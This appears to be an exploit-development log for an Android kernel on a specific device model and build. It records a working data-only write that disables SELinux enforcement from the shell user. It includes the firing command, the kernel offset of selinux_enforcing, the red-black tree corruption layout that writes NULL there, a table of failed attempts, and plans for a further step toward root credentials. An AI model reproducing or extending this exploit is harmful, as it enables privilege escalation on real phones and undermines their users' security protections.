# Z4 — SELinux Permissive park (2026-08-23)

**Branch:** `research-master`  
**Device:** CPH2521 / `5.10.236-android12-9-o-g74d132f4467a`  
**Tag:** `Z4_MODE4_SLIDE_ZERO_1_DATAONLY_TARGET_0x2a793c8_MODE4_SWAP_NOCFI_1_20260823_205147`

## Result

```
enf_wrote=1  enforce_after=0  CLASS=ALIVE
boot_id unchanged 9339897d-b302-4bd6-91e3-6439149c9209
getenforce → Permissive
dmesg readable (was SELinux-denied)
uid still 2000(shell)
```

This is the Samsung / JoinChang **W1 park**: SELinux off, device lives, no fops, no configfs, no uid0 yet.

## Fire

```powershell
.\fire_mode.ps1 -ModeEnv "MODE4_SLIDE_ZERO=1 DATAONLY_TARGET=0x2a793c8 MODE4_SWAP_NOCFI=1" -TagPrefix "Z4"
```

`DATAONLY_TARGET=0x2a793c8` is image offset of `selinux_enforcing` (JoinChang CPH table). Store is P0 `ffffff802aa793c8`. **No KASLR.** `MODE4_SWAP_NOCFI=1` skips ashmem open after the walk.

## Geometry that worked

JoinChang write-1 / emerald NULL — **not** `parent=0; left=target`.

1. **Heap `W0.pi` inert `(1,0,0)`.** Z2 packed only-left `parent=fake_fops, left=selinux` and stored a kernel pointer into enforcing → punch KP (Samsung: non-NULL STORE = panic).
2. **Stack leaf:** `tree_pc = (selinux-8) & ~1` (red), `left=right=0`. `__rb_change_child` else-branch writes NULL into `parent->rb_right` = `*selinux_enforcing`.
3. Color **red** so `rb_erase_color` does not walk `selinux-8` as a tree node.

## What failed (do not repeat)

| Tag | Why |
|-----|-----|
| Z1 `MODE4_DATAONLY` | `task=` was unslid KIMAGE `ffffffc00a7cc000` |
| Z2/Z3 `tree_pc=0; left=target` | `lock.waiters` became selinux → KP |
| N11/N12 SWAP + open `/dev/ashmem<uuid>` | `cfi_before_open` panics with spray still live |
| Z5 second walk (`kptr_restrict`) on the **park boot** | SOFTBOOT at requeue. One GhostLock walk per boot. |

`fire_mode.ps1` classifies Z4 as `write_proof_miss` because it keys `landed` off boot_id, not `enf_wrote`. Trust `enforce_after=0` + `CLASS=ALIVE`.

## Next (uid0)

Fresh boot. One Z4-shape fire for enforcing. **Stop.** Then a **separate** cred walk (JoinChang mode=2 / `init_cred` child), not a second punch on the live park. Do not reopen ashmem swap until cred is designed.

Logs: `logs/aarif_pull/Z4_*`
